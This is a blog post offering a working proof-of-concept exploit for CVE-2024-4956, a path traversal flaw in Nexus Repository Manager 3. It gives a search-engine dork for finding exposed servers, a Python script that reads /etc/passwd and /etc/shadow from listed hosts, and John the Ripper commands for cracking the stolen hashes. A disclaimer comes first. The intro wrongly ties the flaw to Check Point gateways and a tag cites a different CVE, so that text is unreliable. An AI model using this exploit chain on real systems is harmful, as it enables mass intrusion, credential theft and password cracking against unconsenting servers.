[Open in
app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ff24b1a595e0e&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---two_column_layout_nav----------------------------------)

Sign up

[Sign
in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-traversal-f24b1a595e0e&source=post_page---
two_column_layout_nav-----------------------global_nav-----------)

[](/?source=---two_column_layout_nav----------------------------------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-
story&source=---two_column_layout_nav-----------------------
new_post_topnav-----------)

[](/search?source=---two_column_layout_nav----------------------------------)

Sign up

[Sign
in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-traversal-f24b1a595e0e&source=post_page---
two_column_layout_nav-----------------------global_nav-----------)

# POC — CVE-2024–4956 -Unauthenticated Path Traversal

[](/@verylazytech?source=post_page-----
f24b1a595e0e--------------------------------)

[Very Lazy Tech](/@verylazytech?source=post_page-----
f24b1a595e0e--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fdefbb8c3cf98&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=post_page-
defbb8c3cf98----f24b1a595e0e---------------------post_header-----------)

3 min read

·

Jun 10, 2024

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Ff24b1a595e0e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=-----f24b1a595e0e
---------------------clap_footer-----------)

\--

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Ff24b1a595e0e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&source=-----f24b1a595e0e---------------------
bookmark_footer-----------)

Listen

Share

POC — CVE-2024–4956 — Nexus Repository Manager 3 Unauthenticated Path
Traversal

Potentially allowing an attacker to read certain information on Check Point
Security Gateways once connected to the internet and enabled with Remote
Access VPN or Mobile Access Software Blades. A security fix that mitigates
this vulnerability is available.

> Read about it —
> [CVE-2024–4956](https://nvd.nist.gov/vuln/detail/CVE-2024-4956)

 _Disclaimer: This Proof of Concept (POC) is made for educational and ethical
testing purposes only. Usage of this tool for attacking targets without prior
mutual consent is illegal. It is the end user’s responsibility to obey all
applicable local, state, and federal laws. Developers assume no liability and
are not responsible for any misuse or damage caused by this program._

# Finding Targets

To find potential targets, use Fofa (similar to Shodan.io):

  * Fofa Dork: `header="Server: Nexus/3.53.0-01 (OSS)"`

First, clone the repository:

    
    
    git clone https://github.com/verylazytech/CVE-2024-4956

Or copy code manually:

    
    
    import requests  
    import random  
    import argparse  
    from colorama import Fore, Style  
      
    green = Fore.GREEN  
    magenta = Fore.MAGENTA  
    cyan = Fore.CYAN  
    mixed = Fore.RED + Fore.BLUE  
    red = Fore.RED  
    blue = Fore.BLUE  
    yellow = Fore.YELLOW  
    white = Fore.WHITE  
    reset = Style.RESET_ALL  
    bold = Style.BRIGHT  
    colors = [green, cyan, blue]  
    random_color = random.choice(colors)  
      
      
    def banner():  
        banner = f"""{bold}{random_color}  
      ______     _______   ____   ___ ____  _  _     _  _   ___  ____   __     
     / ___\ \   / / ____| |___ \ / _ \___ \| || |   | || | / _ \| ___| / /_    
    | |    \ \ / /|  _|     __) | | | |__) | || |_  | || || (_) |___ \| '_ \   
    | |___  \ V / | |___   / __/| |_| / __/|__   _| |__   _\__, |___) | (_) |  
     \____|  \_/  |_____| |_____|\___/_____|  |_|      |_|   /_/|____/ \___/   
                                                                               
    __     __                _                      _____         _       
    \ \   / /__ _ __ _   _  | |    __ _ _____   _  |_   _|__  ___| |__    
     \ \ / / _ \ '__| | | | | |   / _` |_  / | | |   | |/ _ \/ __| '_ \   
      \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |   | |  __/ (__| | | |  
       \_/ \___|_|   \__, | |_____\__,_/___|\__, |   |_|\___|\___|_| |_|  
                     |___/                  |___/                         
                                                                                           
                        {bold}{white}@VeryLazyTech - Medium {reset}\n"""  
                          
        return banner  
      
      
    def read_ip_port_list(file_path):  
        with open(file_path, 'r') as file:  
            lines = file.readlines()  
        return [line.strip() for line in lines]  
      
      
    def make_request(ip_port, url_path):  
        url = f"http://{ip_port}/{url_path}"  
        try:  
            response = requests.get(url, timeout=5)   
            return response.text  
        except requests.RequestException as e:  
            return None  
      
      
    def main(ip_port_list):  
        for ip_port in ip_port_list:  
            for url_path in ["%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd", "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow"]:  
                response_text = make_request(ip_port, url_path)  
                if response_text and "nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false" not in response_text and "Not Found" not in response_text and "400 Bad Request" not in response_text and "root" in response_text:  
                    print(f"Address: {ip_port}")  
                    print(f"File Contents for passwd:\n{response_text}" if "passwd" in url_path else f"File Contents for shadow:\n{response_text}")  
                    break  
      
      
    if __name__ == "__main__":  
        parser = argparse.ArgumentParser(description=f"[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4956", usage=argparse.SUPPRESS)  
        group = parser.add_mutually_exclusive_group(required=True)  
        group.add_argument("-u", "--url", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP with port for vulnerability detection\n")  
        group.add_argument("-l", "--list", type=str, help=f"[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection\n")  
        args = parser.parse_args()  
          
        if args.list:  
            ip_port_list = read_ip_port_list(args.list)  
            print(banner())  
            main(ip_port_list)  
        elif args.url:  
            ip_port_list = [args.url]  
            print(banner())  
            main(ip_port_list)  
        else:  
            print(banner())  
            parser.print_help()

Next chose your target and add it to list.txt file in this format:

  * <https://ip_address>

Run the Exploit:

    
    
    python3 CVE-2024-4956.py -l list.txt

The output is passwd and shadow files that found:

Now after you find both file passwd & shadow you can try crack the hash with
JohnTheRipper, after running the exploit you have 2 files, passwd & shadow, so
you can merge them into one file and try crack them (I used rockyou.txt but it
can be any password wordlist):

    
    
    unshadow passwd shadow > unshadowed.txt
    
    
    john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

📎 If You like my content and you want some more, [View On My Shop bundle of
20+ E-Books for your OSCP!](https://buymeacoffee.com/verylazytech/e/258177)

📎 [Buy me a Coffee](https://buymeacoffee.com/verylazytech)

[Cve 2023 4966](/tag/cve-2023-4966?source=post_page-----f24b1a595e0e
---------------cve_2023_4966-----------------)

[Cybersecurity](/tag/cybersecurity?source=post_page-----f24b1a595e0e
---------------cybersecurity-----------------)

[Hacking](/tag/hacking?source=post_page-----f24b1a595e0e---------------
hacking-----------------)

[Bug Bounty](/tag/bug-bounty?source=post_page-----f24b1a595e0e---------------
bug_bounty-----------------)

[Vulnerability](/tag/vulnerability?source=post_page-----f24b1a595e0e
---------------vulnerability-----------------)

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Ff24b1a595e0e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=-----f24b1a595e0e
---------------------clap_footer-----------)

\--

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Ff24b1a595e0e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=-----f24b1a595e0e
---------------------clap_footer-----------)

\--

[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Ff24b1a595e0e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&source=--------------------------bookmark_footer-----------)

[](/@verylazytech?source=post_page-----
f24b1a595e0e--------------------------------)

Follow

[](/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3e1c6e2f5fa9&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&newsletterV3=defbb8c3cf98&newsletterV3Id=3e1c6e2f5fa9&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=-----f24b1a595e0e
---------------------subscribe_user-----------)

## [Written by Very Lazy Tech](/@verylazytech?source=post_page-----
f24b1a595e0e--------------------------------)

[251 Followers](/@verylazytech/followers?source=post_page-----
f24b1a595e0e--------------------------------)

🛋️ Welcome to Very Lazy Tech! 🖥️ Hey, I'm your tech guide focused on
simplicity. Join me as we navigate the world of tech with ease.

Follow

[](/m/signin?actionUrl=%2F_%2Fapi%2Fsubscriptions%2Fnewsletters%2F3e1c6e2f5fa9&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40verylazytech%2Fpoc-
cve-2024-4956-unauthenticated-path-
traversal-f24b1a595e0e&newsletterV3=defbb8c3cf98&newsletterV3Id=3e1c6e2f5fa9&user=Very+Lazy+Tech&userId=defbb8c3cf98&source=-----f24b1a595e0e
---------------------subscribe_user-----------)

[Help](https://help.medium.com/hc/en-us?source=post_page-----
f24b1a595e0e--------------------------------)

[Status](https://medium.statuspage.io/?source=post_page-----
f24b1a595e0e--------------------------------)

[About](/about?autoplay=1&source=post_page-----
f24b1a595e0e--------------------------------)

[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----
f24b1a595e0e--------------------------------)

[Press](pressinquiries@medium.com?source=post_page-----
f24b1a595e0e--------------------------------)

[Blog](https://blog.medium.com/?source=post_page-----
f24b1a595e0e--------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-
policy-f03bf92035c9?source=post_page-----
f24b1a595e0e--------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-
service-9db0094a1e0f?source=post_page-----
f24b1a595e0e--------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----
f24b1a595e0e--------------------------------)

[Teams](/business?source=post_page-----
f24b1a595e0e--------------------------------)

